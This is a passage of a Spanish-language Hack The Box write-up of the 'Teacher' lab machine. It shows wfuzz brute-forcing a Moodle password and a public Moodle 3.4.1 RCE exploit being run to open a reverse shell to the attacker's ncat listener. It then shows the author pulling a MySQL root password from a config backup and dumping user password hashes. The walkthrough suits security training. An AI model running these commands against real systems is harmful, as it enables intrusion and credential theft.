2019-01-15 20:26:33 (1.92 MB/s) - “10.10.10.153/images/5_14.png” guardado [6063/6063]

--2019-01-15 20:26:33--  http://10.10.10.153/images/5_15.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6564 (6.4K) [image/png]
Grabando a: “10.10.10.153/images/5_15.png”

10.10.10.153/images/5_15.png                    100%[=====================================================================================================>]   6.41K  --.-KB/s    en 0.003s

2019-01-15 20:26:33 (2.05 MB/s) - “10.10.10.153/images/5_15.png” guardado [6564/6564]

--2019-01-15 20:26:33--  http://10.10.10.153/images/5_16.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6247 (6.1K) [image/png]
Grabando a: “10.10.10.153/images/5_16.png”

10.10.10.153/images/5_16.png                    100%[=====================================================================================================>]   6.10K  --.-KB/s    en 0.002s

2019-01-15 20:26:33 (3.07 MB/s) - “10.10.10.153/images/5_16.png” guardado [6247/6247]

ACABADO --2019-01-15 20:26:33--
Tiempo total de reloj: 11s
Descargados: 85 ficheros, 2.2M en 1.8s (1.20 MB/s)
```

Revisando archivo por archivo no encontraremos nada importante. Pero algo llamo mi atención al hacer un file sobre todos los archivos:

```text
xbytemx@laptop:~/htb/teacher/10.10.10.153$ find . -exec file {} \;
.: directory
./css: directory
./css/style.css: ASCII text, with CRLF line terminators
./fonts: directory
./fonts/BebasNeueBold.eot?: Embedded OpenType (EOT), BebasNeueBold family
./fonts/BebasNeueBook.svg: SVG Scalable Vector Graphics image
./fonts/BebasNeueRegular.svg: SVG Scalable Vector Graphics image
./fonts/BebasNeueBold.woff: Web Open Font Format, TrueType, length 31404, version 1.300
./fonts/BebasNeueBook.ttf: TrueType Font data, 18 tables, 1st "FFTM", 32 names, Macintosh
./fonts/BebasNeueBook.eot?: Embedded OpenType (EOT), BebasNeueBook family
./fonts/BebasNeueBold.svg: SVG Scalable Vector Graphics image
./fonts/BebasNeueBook.eot: Embedded OpenType (EOT), BebasNeueBook family
./fonts/BebasNeueBold.eot: Embedded OpenType (EOT), BebasNeueBold family
./fonts/BebasNeueBook.woff: Web Open Font Format, TrueType, length 34696, version 1.3
./fonts/BebasNeueBold.ttf: TrueType Font data, 18 tables, 1st "FFTM", 32 names, Macintosh
./fonts/BebasNeueRegular.ttf: TrueType Font data, 18 tables, 1st "FFTM", 30 names, Macintosh
./fonts/BebasNeueRegular.eot: Embedded OpenType (EOT), BebasNeueRegular family
./fonts/BebasNeueRegular.eot?: Embedded OpenType (EOT), BebasNeueRegular family
./fonts/BebasNeueRegular.woff: Web Open Font Format, TrueType, length 33700, version 1.3
./index.html: HTML document, UTF-8 Unicode text
./gallery.html: HTML document, ASCII text, with CRLF line terminators
./js: directory
./js/plugins.js: ASCII text, with very long lines, with CRLF line terminators
./js/jquery-1.11.1.min.js: ASCII text, with very long lines
./js/main.js: ASCII text, with CRLF line terminators
./images: directory
./images/bg_white.png: PNG image data, 1920 x 30, 8-bit/color RGBA, non-interlaced
./images/logo.png: PNG image data, 121 x 134, 8-bit/color RGBA, non-interlaced
./images/pic_slide.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=12, height=600, bps=158, PhotometricIntepretation=RGB, orientation=upper-left, width=1920], progressive, precision 8, 1920x600, components 3
./images/5_13.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/5_5.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/5.png: ASCII text
./images/5_4.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/ico_place_2.png: PNG image data, 13 x 16, 8-bit/color RGBA, non-interlaced
./images/bg_arrow_blue_dark@2x.png: PNG image data, 20 x 14, 8-bit/color RGBA, non-interlaced
./images/5_8.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/ico_contacts@2x.png: PNG image data, 64 x 172, 8-bit/color RGBA, non-interlaced
./images/bg_slider_nav.png: PNG image data, 24 x 13, 8-bit/color RGBA, non-interlaced
./images/ico_place.png: PNG image data, 13 x 16, 8-bit/color RGBA, non-interlaced
./images/ico_place_2@2x.png: PNG image data, 26 x 32, 8-bit/color RGBA, non-interlaced
./images/bg_menu_trigger.png: PNG image data, 31 x 30, 8-bit/color RGBA, non-interlaced
./images/5_16.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/ico_time_2@2x.png: PNG image data, 33 x 33, 8-bit/color RGBA, non-interlaced
./images/bg_arrow_information@2x.png: PNG image data, 360 x 114, 8-bit/color RGBA, non-interlaced
./images/ico_close.png: PNG image data, 50 x 50, 8-bit/color RGBA, non-interlaced
./images/ico_place@2x.png: PNG image data, 26 x 32, 8-bit/color RGBA, non-interlaced
./images/bg_arrow_blue.png: PNG image data, 10 x 7, 8-bit/color RGBA, non-interlaced
./images/ico_close@2x.png: PNG image data, 100 x 100, 8-bit/color RGBA, non-interlaced
./images/bg_arrow_nav.png: PNG image data, 52 x 17, 8-bit/color RGBA, non-interlaced
./images/bg_arrow@2x.png: PNG image data, 72 x 38, 8-bit/color RGBA, non-interlaced
./images/ico_time@2x.png: PNG image data, 33 x 33, 8-bit/color RGBA, non-interlaced
./images/ico_form.png: PNG image data, 19 x 173, 8-bit/color RGBA, non-interlaced
./images/1.png: PNG image data, 112 x 112, 8-bit/color RGBA, non-interlaced
./images/3.png: PNG image data, 242 x 268, 8-bit/color RGBA, non-interlaced
./images/5_7.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/bg_slider_nav_2@2x.png: PNG image data, 64 x 34, 8-bit/color RGBA, non-interlaced
./images/bg_arrow.png: PNG image data, 36 x 19, 8-bit/color RGBA, non-interlaced
./images/1_1.png: PNG image data, 112 x 112, 8-bit/color RGBA, non-interlaced
./images/bg_white_arrow@2x.png: PNG image data, 232 x 60, 8-bit/color RGBA, non-interlaced
./images/ico_time_2.png: PNG image data, 17 x 16, 8-bit/color RGBA, non-interlaced
./images/bg_arrow_nav@2x.png: PNG image data, 104 x 34, 8-bit/color RGBA, non-interlaced
./images/bg_arrow_select.png: PNG image data, 15 x 7, 8-bit/color RGBA, non-interlaced
./images/5_12.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/bg_white@2x.png: PNG image data, 3840 x 60, 8-bit/color RGBA, non-interlaced
./images/ico_form@2x.png: PNG image data, 38 x 346, 8-bit/color RGBA, non-interlaced
./images/ico_information@2x.png: PNG image data, 129 x 129, 8-bit/color RGBA, non-interlaced
./images/ico_social@2x.png: PNG image data, 104 x 106, 8-bit/color RGBA, non-interlaced
./images/bg_blue.png: PNG image data, 1 x 1, 8-bit/color RGBA, non-interlaced
./images/ico_time.png: PNG image data, 17 x 16, 8-bit/color RGBA, non-interlaced
./images/5_14.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/5_6.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/ico_contacts.png: PNG image data, 32 x 86, 8-bit/color RGBA, non-interlaced
./images/bg_arrow_blue@2x.png: PNG image data, 20 x 14, 8-bit/color RGBA, non-interlaced
./images/5_3.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/logo@2x.png: PNG image data, 242 x 268, 8-bit/color RGBA, non-interlaced
./images/5_2.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/bg_arrow_information.png: PNG image data, 180 x 57, 8-bit/color RGBA, non-interlaced
./images/bg_menu_trigger@2x.png: PNG image data, 62 x 60, 8-bit/color RGBA, non-interlaced
./images/5_9.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/bg_slider_nav_2.png: PNG image data, 32 x 17, 8-bit/color RGBA, non-interlaced
./images/5_10.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/2.png: PNG image data, 242 x 268, 8-bit/color RGBA, non-interlaced
./images/ico_information.png: PNG image data, 65 x 64, 8-bit/color RGBA, non-interlaced
./images/bg_arrow_blue_dark.png: PNG image data, 10 x 7, 8-bit/color RGBA, non-interlaced
./images/bg_slider_nav@2x.png: PNG image data, 48 x 26, 8-bit/color RGBA, non-interlaced
./images/bg_arrow_select@2x.png: PNG image data, 30 x 14, 8-bit/color RGBA, non-interlaced
./images/5_15.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/5_11.png: PNG image data, 153 x 153, 8-bit/color RGB, non-interlaced
./images/ico_social.png: PNG image data, 52 x 53, 8-bit/color RGBA, non-interlaced
./images/bg_white_arrow.png: PNG image data, 117 x 30, 8-bit/color RGBA, non-interlaced
```

Exactamente en:

```
./images/5.png: ASCII text
```

Mas concretamente si visitamos la pagina veremos como aparece "rota" la imagen:

![image 5 of gallery](/img/htb-teacher/www-gallery.png)

Algo no esta bien aquí.

Tratemos esto como si fuera un CTF y estamos ante un reto stego:

```text
xbytemx@laptop:~/htb/teacher$ file 5.png
5.png: ASCII text
xbytemx@laptop:~/htb/teacher$ cat 5.png
Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni
xbytemx@laptop:~/htb/teacher$
```

Tenemos un patrón de contraseña `Th4C00lTheacha` y un usuario **Giovanni**

# Bruteforcing Giovanni's password

Para encontrar las credenciales de Giovanni, usaremos `wfuzz` sobre la aplicación de moodle (ya que en blackhatuni no podemos hacer nada mas de momento):

```text
xbytemx@laptop:~/htb/teacher$ wfuzz -c -z file,/home/xbytemx/git/SecLists/Fuzzing/alphanum-case-extra.txt --hh 440 -d 'username=Giovanni&password=Th4C00lTheachaFUZZ' http://10.10.10.153/moodle/login/index.php

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.153/moodle/login/index.php
Total requests: 95

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000003:  C=303      6 L	      34 W	    454 Ch	  "#"

Total time: 17.16874
Processed Requests: 95
Filtered Requests: 94
Requests/sec.: 5.533309
```

- `-c` para agregarle colores, los cuales no sirven en este caso.
- `-z file,/home/xbytemx/git/SecLists/Fuzzing/alphanum-case-extra.txt` para indicar cual es el diccionario a usar.
- `--hh 440` para indicar que mensajes debe ignorar dependiendo de la cantidad de caracteres, en este caso 440 Chars se ignoran.
- `-d 'username=Giovanni&password=Th4C00lTheachaFUZZ'` para indicarle que se trata de un POST y el data es el usuario y contraseña + FUZZ

`wfuzz` nos ha ayudado a identificar las contraseñas de Gio:

> creds: Giovanni:Th4C00lTheacha#

# Exploiting moodle 3.4

Ahora que tenemos unas credenciales validas y podemos entrar a moodle, buscaremos exploits existentes que nos puedan conducir a un RCE:

```text
xbytemx@laptop:~/git/exploit-database$ ./searchsploit moodle 3.4
------------------------------------------------------- -------------------------------------------------------
 Exploit Title                                         |  Path
                                                       | (/home/xbytemx/git/exploit-database//)
------------------------------------------------------- -------------------------------------------------------
Moodle 3.4.1 - Remote Code Execution                   | exploits/php/webapps/46551.php
------------------------------------------------------- -------------------------------------------------------
Shellcodes: No Result
```

Guardamos el exploit y lo ejecutamos con los parámetros necesarios, no sin antes abrir un listener en nuestra máquina:

Para realizar el RCE:

```text
xbytemx@laptop:~/htb/teacher$ php 46551.php url=http://10.10.10.153/moodle/ user=Giovanni pass=Th4C00lTheacha# ip=10.10.13.42 port=3001 course=2 debug=true
```

En el listener:

```text
xbytemx@laptop:~/htb/teacher$ ncat -nvlp 3001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
Ncat: Connection from 10.10.10.153.
Ncat: Connection from 10.10.10.153:60940.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como nota que no debemos olvidar, este exploit fue gracias al siguiente [artículo](https://blog.ripstech.com/2018/moodle-remote-code-execution/). Básicamente evil teacher consiste en agregar una evaluación de matemáticas que incluye un payload en la formula de respuesta matemática. Cuando esta respuesta pasa por la función `eval()`, es que podemos hacer la ejecución arbitraria de código. Así que el payload es preparado para pasar los filtros y que al llegar a eval podamos ejecutar código remoto.

# From www-data to ****

Continuando como www-data:

```text
$ python -c "import pty; pty.spawn('/bin/bash')"
www-data@teacher:/var/www/html$ cat html/moodle/config.php.save
cat html/moodle/config.php.save
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mariadb';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'root';
$CFG->dbpass    = 'Welkom1!';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8mb4_unicode_ci',
);

$CFG->wwwroot   = 'http://10.10.10.153/moodle'; // CHANGE THIS - Gi$CFG->dataroot  = '/var/www/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
www-data@teacher:/var/www$
```

Excelente, tenemos las credenciales de root... pero de mysql. Probemos la cuenta de Giovanni como giovanni:

```text
www-data@teacher:/var/www$ su - giovanni
su - giovanni
Password: Th4C00lTheacha#

su: Authentication failure
```

Parece que no son las mismas credenciales que hemos obtenido antes. Exploremos la DB para ver que mas podemos encontrar (Recordemos que para que moodle puede funcionar, debe tener una DB declarada donde almacene su información):

```text
www-data@teacher:/var/www$ mysql -u root -p
mysql -u root -p
Enter password: Welkom1!

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 995
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| moodle             |
| mysql              |
| performance_schema |
| phpmyadmin         |
+--------------------+
5 rows in set (0.00 sec)

MariaDB [(none)]> use moodle;
use moodle;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [moodle]> show tables;
show tables;
+----------------------------------+
| Tables_in_moodle                 |
+----------------------------------+
| mdl_analytics_indicator_calc     |
| mdl_analytics_models             |
| mdl_analytics_models_log         |
| mdl_analytics_predict_samples    |
| mdl_analytics_prediction_actions |
| mdl_analytics_predictions        |
| mdl_analytics_train_samples      |
| mdl_analytics_used_analysables   |
| mdl_analytics_used_files         |
| mdl_assign                       |
| mdl_assign_grades                |
| mdl_assign_overrides             |
| mdl_assign_plugin_config         |
| mdl_assign_submission            |
| mdl_assign_user_flags            |
| mdl_assign_user_mapping          |
| mdl_assignfeedback_comments      |
| mdl_assignfeedback_editpdf_annot |
| mdl_assignfeedback_editpdf_cmnt  |
| mdl_assignfeedback_editpdf_queue |
| mdl_assignfeedback_editpdf_quick |
| mdl_assignfeedback_file          |
| mdl_assignment                   |
| mdl_assignment_submissions       |
| mdl_assignment_upgrade           |
| mdl_assignsubmission_file        |
| mdl_assignsubmission_onlinetext  |
| mdl_auth_oauth2_linked_login     |
| mdl_backup_controllers           |
| mdl_backup_courses               |
| mdl_backup_logs                  |
| mdl_badge                        |
| mdl_badge_backpack               |
| mdl_badge_criteria               |
| mdl_badge_criteria_met           |
| mdl_badge_criteria_param         |
| mdl_badge_external               |
| mdl_badge_issued                 |
| mdl_badge_manual_award           |
| mdl_block                        |
| mdl_block_community              |
| mdl_block_instances              |
| mdl_block_positions              |
| mdl_block_recent_activity        |
| mdl_block_rss_client             |
| mdl_blog_association             |
| mdl_blog_external                |
| mdl_book                         |
| mdl_book_chapters                |
| mdl_cache_filters                |
| mdl_cache_flags                  |
| mdl_capabilities                 |
| mdl_chat                         |
| mdl_chat_messages                |
| mdl_chat_messages_current        |
| mdl_chat_users                   |
| mdl_choice                       |
| mdl_choice_answers               |
| mdl_choice_options               |
| mdl_cohort                       |
| mdl_cohort_members               |
| mdl_comments                     |
| mdl_competency                   |
| mdl_competency_coursecomp        |
| mdl_competency_coursecompsetting |
| mdl_competency_evidence          |
| mdl_competency_framework         |
| mdl_competency_modulecomp        |
| mdl_competency_plan              |
| mdl_competency_plancomp          |
| mdl_competency_relatedcomp       |
| mdl_competency_template          |
| mdl_competency_templatecohort    |
| mdl_competency_templatecomp      |
| mdl_competency_usercomp          |
| mdl_competency_usercompcourse    |
| mdl_competency_usercompplan      |
| mdl_competency_userevidence      |
| mdl_competency_userevidencecomp  |
| mdl_config                       |
| mdl_config_log                   |
| mdl_config_plugins               |
| mdl_context                      |
| mdl_context_temp                 |
| mdl_course                       |
| mdl_course_categories            |
| mdl_course_completion_aggr_methd |
| mdl_course_completion_crit_compl |
| mdl_course_completion_criteria   |
| mdl_course_completion_defaults   |
| mdl_course_completions           |
| mdl_course_format_options        |
| mdl_course_modules               |
| mdl_course_modules_completion    |
| mdl_course_published             |
| mdl_course_request               |
| mdl_course_sections              |
| mdl_data                         |
| mdl_data_content                 |
| mdl_data_fields                  |
| mdl_data_records                 |
| mdl_editor_atto_autosave         |
| mdl_enrol                        |
| mdl_enrol_flatfile               |
| mdl_enrol_lti_lti2_consumer      |
| mdl_enrol_lti_lti2_context       |
| mdl_enrol_lti_lti2_nonce         |
| mdl_enrol_lti_lti2_resource_link |
| mdl_enrol_lti_lti2_share_key     |
| mdl_enrol_lti_lti2_tool_proxy    |
| mdl_enrol_lti_lti2_user_result   |
| mdl_enrol_lti_tool_consumer_map  |
| mdl_enrol_lti_tools              |
| mdl_enrol_lti_users              |
| mdl_enrol_paypal                 |
| mdl_event                        |
| mdl_event_subscriptions          |
| mdl_events_handlers              |
| mdl_events_queue                 |
| mdl_events_queue_handlers        |
| mdl_external_functions           |
| mdl_external_services            |
| mdl_external_services_functions  |
| mdl_external_services_users      |
| mdl_external_tokens              |
| mdl_feedback                     |
| mdl_feedback_completed           |
| mdl_feedback_completedtmp        |
| mdl_feedback_item                |
| mdl_feedback_sitecourse_map      |
| mdl_feedback_template            |
| mdl_feedback_value               |
| mdl_feedback_valuetmp            |
| mdl_file_conversion              |
| mdl_files                        |
| mdl_files_reference              |
| mdl_filter_active                |
| mdl_filter_config                |
| mdl_folder                       |
| mdl_forum                        |
| mdl_forum_digests                |
| mdl_forum_discussion_subs        |
| mdl_forum_discussions            |
| mdl_forum_posts                  |
| mdl_forum_queue                  |
| mdl_forum_read                   |
| mdl_forum_subscriptions          |
| mdl_forum_track_prefs            |
| mdl_glossary                     |
| mdl_glossary_alias               |
| mdl_glossary_categories          |
| mdl_glossary_entries             |
| mdl_glossary_entries_categories  |
| mdl_glossary_formats             |
| mdl_grade_categories             |
| mdl_grade_categories_history     |
| mdl_grade_grades                 |
| mdl_grade_grades_history         |
| mdl_grade_import_newitem         |
| mdl_grade_import_values          |
| mdl_grade_items                  |
| mdl_grade_items_history          |
| mdl_grade_letters                |
| mdl_grade_outcomes               |
| mdl_grade_outcomes_courses       |
| mdl_grade_outcomes_history       |
| mdl_grade_settings               |
| mdl_grading_areas                |
| mdl_grading_definitions          |
| mdl_grading_instances            |
| mdl_gradingform_guide_comments   |
| mdl_gradingform_guide_criteria   |
| mdl_gradingform_guide_fillings   |
| mdl_gradingform_rubric_criteria  |
| mdl_gradingform_rubric_fillings  |
| mdl_gradingform_rubric_levels    |
| mdl_groupings                    |
| mdl_groupings_groups             |
| mdl_groups                       |
| mdl_groups_members               |
| mdl_imscp                        |
| mdl_label                        |
| mdl_lesson                       |
| mdl_lesson_answers               |
| mdl_lesson_attempts              |
| mdl_lesson_branch                |
| mdl_lesson_grades                |
| mdl_lesson_overrides             |
| mdl_lesson_pages                 |
| mdl_lesson_timer                 |
| mdl_license                      |
| mdl_lock_db                      |
| mdl_log                          |
| mdl_log_display                  |
| mdl_log_queries                  |
| mdl_logstore_standard_log        |
| mdl_lti                          |
| mdl_lti_submission               |
| mdl_lti_tool_proxies             |
| mdl_lti_tool_settings            |
| mdl_lti_types                    |
| mdl_lti_types_config             |
| mdl_message                      |
| mdl_message_airnotifier_devices  |
| mdl_message_contacts             |
| mdl_message_popup                |
| mdl_message_processors           |
| mdl_message_providers            |
| mdl_message_read                 |
| mdl_message_working              |
| mdl_messageinbound_datakeys      |
| mdl_messageinbound_handlers      |
| mdl_messageinbound_messagelist   |
| mdl_mnet_application             |
| mdl_mnet_host                    |
| mdl_mnet_host2service            |
| mdl_mnet_log                     |
| mdl_mnet_remote_rpc              |
| mdl_mnet_remote_service2rpc      |
| mdl_mnet_rpc                     |
| mdl_mnet_service                 |
| mdl_mnet_service2rpc             |
| mdl_mnet_session                 |
| mdl_mnet_sso_access_control      |
| mdl_mnetservice_enrol_courses    |
| mdl_mnetservice_enrol_enrolments |
| mdl_modules                      |
| mdl_my_pages                     |
| mdl_oauth2_endpoint              |
| mdl_oauth2_issuer                |
| mdl_oauth2_system_account        |
| mdl_oauth2_user_field_mapping    |
| mdl_page                         |
| mdl_portfolio_instance           |
| mdl_portfolio_instance_config    |
| mdl_portfolio_instance_user      |
| mdl_portfolio_log                |
| mdl_portfolio_mahara_queue       |
| mdl_portfolio_tempdata           |
| mdl_post                         |
| mdl_profiling                    |
| mdl_qtype_ddimageortext          |
| mdl_qtype_ddimageortext_drags    |
| mdl_qtype_ddimageortext_drops    |
| mdl_qtype_ddmarker               |
| mdl_qtype_ddmarker_drags         |
| mdl_qtype_ddmarker_drops         |
| mdl_qtype_essay_options          |
| mdl_qtype_match_options          |
| mdl_qtype_match_subquestions     |
| mdl_qtype_multichoice_options    |
| mdl_qtype_randomsamatch_options  |
| mdl_qtype_shortanswer_options    |
| mdl_question                     |
| mdl_question_answers             |
| mdl_question_attempt_step_data   |
| mdl_question_attempt_steps       |
| mdl_question_attempts            |
| mdl_question_calculated          |
| mdl_question_calculated_options  |
| mdl_question_categories          |
| mdl_question_dataset_definitions |
| mdl_question_dataset_items       |
| mdl_question_datasets            |
| mdl_question_ddwtos              |
| mdl_question_gapselect           |
| mdl_question_hints               |
| mdl_question_multianswer         |
| mdl_question_numerical           |
| mdl_question_numerical_options   |
| mdl_question_numerical_units     |
| mdl_question_response_analysis   |
| mdl_question_response_count      |
| mdl_question_statistics          |
| mdl_question_truefalse           |
| mdl_question_usages              |
| mdl_quiz                         |
| mdl_quiz_attempts                |
| mdl_quiz_feedback                |
| mdl_quiz_grades                  |
| mdl_quiz_overrides               |
| mdl_quiz_overview_regrades       |
| mdl_quiz_reports                 |
| mdl_quiz_sections                |
| mdl_quiz_slots                   |
| mdl_quiz_statistics              |
| mdl_rating                       |
| mdl_registration_hubs            |
| mdl_repository                   |
| mdl_repository_instance_config   |
| mdl_repository_instances         |
| mdl_repository_onedrive_access   |
| mdl_resource                     |
| mdl_resource_old                 |
| mdl_role                         |
| mdl_role_allow_assign            |
| mdl_role_allow_override          |
| mdl_role_allow_switch            |
| mdl_role_assignments             |
| mdl_role_capabilities            |
| mdl_role_context_levels          |
| mdl_role_names                   |
| mdl_role_sortorder               |
| mdl_scale                        |
| mdl_scale_history                |
| mdl_scorm                        |
| mdl_scorm_aicc_session           |
| mdl_scorm_scoes                  |
| mdl_scorm_scoes_data             |
| mdl_scorm_scoes_track            |
| mdl_scorm_seq_mapinfo            |
| mdl_scorm_seq_objective          |
| mdl_scorm_seq_rolluprule         |
| mdl_scorm_seq_rolluprulecond     |
| mdl_scorm_seq_rulecond           |
| mdl_scorm_seq_ruleconds          |
| mdl_search_index_requests        |
| mdl_sessions                     |
| mdl_stats_daily                  |
| mdl_stats_monthly                |
| mdl_stats_user_daily             |
| mdl_stats_user_monthly           |
| mdl_stats_user_weekly            |
| mdl_stats_weekly                 |
| mdl_survey                       |
| mdl_survey_analysis              |
| mdl_survey_answers               |
| mdl_survey_questions             |
| mdl_tag                          |
| mdl_tag_area                     |
| mdl_tag_coll                     |
| mdl_tag_correlation              |
| mdl_tag_instance                 |
| mdl_task_adhoc                   |
| mdl_task_scheduled               |
| mdl_tool_cohortroles             |
| mdl_tool_customlang              |
| mdl_tool_customlang_components   |
| mdl_tool_monitor_events          |
| mdl_tool_monitor_history         |
| mdl_tool_monitor_rules           |
| mdl_tool_monitor_subscriptions   |
| mdl_tool_recyclebin_category     |
| mdl_tool_recyclebin_course       |
| mdl_tool_usertours_steps         |
| mdl_tool_usertours_tours         |
| mdl_upgrade_log                  |
| mdl_url                          |
| mdl_user                         |
| mdl_user_devices                 |
| mdl_user_enrolments              |
| mdl_user_info_category           |
| mdl_user_info_data               |
| mdl_user_info_field              |
| mdl_user_lastaccess              |
| mdl_user_password_history        |
| mdl_user_password_resets         |
| mdl_user_preferences             |
| mdl_user_private_key             |
| mdl_wiki                         |
| mdl_wiki_links                   |
| mdl_wiki_locks                   |
| mdl_wiki_pages                   |
| mdl_wiki_subwikis                |
| mdl_wiki_synonyms                |
| mdl_wiki_versions                |
| mdl_workshop                     |
| mdl_workshop_aggregations        |
| mdl_workshop_assessments         |
| mdl_workshop_assessments_old     |
| mdl_workshop_comments_old        |
| mdl_workshop_elements_old        |
| mdl_workshop_grades              |
| mdl_workshop_grades_old          |
| mdl_workshop_old                 |
| mdl_workshop_rubrics_old         |
| mdl_workshop_stockcomments_old   |
| mdl_workshop_submissions         |
| mdl_workshop_submissions_old     |
| mdl_workshopallocation_scheduled |
| mdl_workshopeval_best_settings   |
| mdl_workshopform_accumulative    |
| mdl_workshopform_comments        |
| mdl_workshopform_numerrors       |
| mdl_workshopform_numerrors_map   |
| mdl_workshopform_rubric          |
| mdl_workshopform_rubric_config   |
| mdl_workshopform_rubric_levels   |
+----------------------------------+
388 rows in set (0.01 sec)
```

Esas fueron muchas tablas. Todo para ir tras mdl_users:

```text
MariaDB [moodle]> select * from mdl_user;
select * from mdl_user;
+------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+
| id   | auth   | confirmed | policyagreed | deleted | suspended | mnethostid | username    | password                                                     | idnumber | firstname  | lastname | email          | emailstop | icq | skype | yahoo | aim | msn | phone1 | phone2 | institution | department | address | city | country | lang | calendartype | theme | timezone | firstaccess | lastaccess | lastlogin  | currentlogin | lastip        | secret | picture | url | description                                                               | descriptionformat | mailformat | maildigest | maildisplay | autosubscribe | trackforums | timecreated | timemodified | trustbitmask | imagealt | lastnamephonetic | firstnamephonetic | middlename | alternatename |
+------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+
|    1 | manual |         1 |            0 |       0 |         0 |          1 | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |          | Guest user |          | root@localhost |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | This user is a special user that allows read-only access to some courses. |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |   1530058999 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          |
|    2 | manual |         1 |            0 |       0 |         0 |          1 | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |          | Admin      | User     | gio@gio.nl     |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059097 | 1530059573 | 1530059097 |   1530059307 | 192.168.206.1 |        |       0 |     |                                                                           |                 1 |          1 |          0 |           1 |             1 |           0 |           0 |   1530059135 |            0 | NULL     |                  |                   |            |               |
|    3 | manual |         1 |            0 |       0 |         0 |          1 | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |          | Giovanni   | Chhatta  | Giio@gio.nl    |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059681 | 1554439754 | 1554438499 |   1554438765 | 10.10.15.239  |        |       0 |     |                                                                           |                 1 |          1 |          0 |           2 |             1 |           0 |  1530059291 |   1554437240 |            0 |          |                  |                   |            |               |
| 1337 | manual |         0 |            0 |       0 |         0 |          0 | Giovannibak | 7a860966115182402ed06375cf0a22af                             |          |            |          |                |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | NULL                                                                      |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |            0 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          |
+------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+
4 rows in set (0.00 sec)

MariaDB [moodle]>
```

